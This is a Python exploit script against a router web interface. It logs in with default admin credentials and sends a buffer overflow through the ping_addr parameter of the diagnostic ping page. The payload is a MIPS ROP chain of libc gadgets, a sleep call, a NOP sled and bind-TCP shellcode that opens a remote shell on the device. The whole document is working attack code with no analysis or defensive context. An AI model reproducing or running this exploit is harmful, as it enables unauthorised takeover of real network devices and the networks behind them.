from pwn import *
import requests
import md5
import string
import socket
from urllib import quote

password = md5.new('admin').hexdigest()
cookie = base64.b64encode('admin:'+password)
cookie = cookie.replace('=','%3D')

print '[+] Cookie:',cookie
print '[+] Login to generate user directory...'

loginUrl = 'http://192.168.0.1/userRpm/LoginRpm.htm?Save=Save'
headers = {'cookie':'Authorization=Basic%20'+cookie}
req = requests.get(loginUrl, headers=headers)
directory = ''

nop = b'\x27\xe0\xff\xff'

libcBase = 0x2b620000        # may be change

sleep = libcBase + 0x53ca0
gadget1 = libcBase + 0x00055c60
gadget2 = libcBase + 0x00024ecc
gadget3 = libcBase + 0x0001e20c
gadget4 = libcBase + 0x000195f4
gadget5 = libcBase + 0x000154d8

print "[+] First gadget address: ", hex(gadget1)
print "[+] Second gadget address: ", hex(gadget2)
print "[+] Third gadget address: ", hex(gadget3)
print "[+] Fourth gadget address: ", hex(gadget4)
print "[+] Fifth gadget address: ", hex(gadget4)
print "[+] Sleep function address: ", hex(sleep)

shellcode_bindtcp = '\x24\x0f\xff\xfa\x01\xe0\x78\x27\x21\xe4\xff\xfd\x21\xe5\xff\xfd\x28\x06\xff\xff\xaf\xa4\xff\xf4\xaf\xa5\xff\xf8\xaf\xa6\xff\xfc\x23\xa5\xff\xf4\x24\x0f\xff\xfe\x01\xe0\x78\x27\xaf\xaf\xff\xdc\x8f\xa4\xff\xdc\x24\x02\x10\x06\x01\x01\x01\x0c\xaf\xa2\xff\xfc\x24\x0f\xff\xfd\x01\xe0\x78\x27\xaf\xaf\xff\xdc\x8f\xa4\xff\xdc\xaf\xaf\xff\xe0\x3c\x0e\x11\x5c\xaf\xae\xff\xe4\xaf\xa0\xff\xe8\x23\xa5\xff\xe2\x24\x0e\xff\xef\x24\x01\xff\xef\x01\xc1\x70\x27\x8f\xac\xff\xfc\xaf\xac\xff\xf0\xaf\xa5\xff\xf4\xaf\xae\xff\xf8\x23\xa5\xff\xf0\x24\x02\x10\x06\x01\x01\x01\x0c\x8f\xac\xff\xfc\xaf\xac\xff\xe0\xaf\xa0\xff\xe4\x23\xa5\xff\xe0\x24\x0f\xff\xfb\x01\xe0\x78\x27\xaf\xaf\xff\xdc\x8f\xa4\xff\xdc\x24\x02\x10\x06\x01\x01\x01\x0c\xaf\xa0\xff\xe8\x24\x0f\xff\xfa\x01\xe0\x78\x27\xaf\xaf\xff\xdc\x8f\xa4\xff\xdc\x24\x02\x10\x06\x01\x01\x01\x0c\xaf\xa2\xff\xfc\x24\x0f\xff\xfd\x01\xe0\x78\x27\x8f\xa4\xff\xfc\x01\xe0\x28\x25\x24\x02\x0f\xdf\x01\x01\x01\x0c\x24\x10\xff\xff\x21\xef\xff\xff\x15\xf0\xff\xfa\x28\x06\xff\xff\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xec\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xae\xff\xf0\xaf\xa0\xff\xf4\x23\xa4\xff\xec\xaf\xa4\xff\xf8\xaf\xa0\xff\xfc\x23\xa5\xff\xf8\x24\x02\x0f\xab\x01\x01\x01\x0c'

payload = b'A'*160
payload += b'B'*4
payload += p32(gadget2,endian='big')
payload += p32(gadget1,endian='big')
payload += b'C'*40
payload += p32(sleep,endian='big')
payload += p32(gadget3,endian='big')
payload += b'D'*28
payload += p32(gadget5,endian='big')
payload += b'E'*4
payload += p32(gadget4,endian='big')
payload += nop*32
payload += shellcode_bindtcp

if(req.status_code):
        directory = req.text.split('=')[2].split('/')[3]
        print'[+] Retrieved folder name: ',directory
        req.close()

        referer = 'http://192.168.0.1/{0}/userRpm/DiagnosticRpm.htm'.format(directory)
        host = '192.168.0.1'
        port = 80

        pingUrl = directory + '/userRpm/PingIframeRpm.htm'
        pingUrl += '?ping_addr='+quote(payload)+'&doType=ping&isNew=new&sendNum=4&psize=64&overTime=800&trHops=20'
        pingUrl = 'http://192.168.0.1/'+pingUrl

        print(pingUrl)
        auth = 'Authorization=Basic%20'+cookie
        headers = {'Referer':referer,'Cookie':auth}

        s=requests.get(pingUrl,headers=headers)
        s.close()
else:
        req.close()
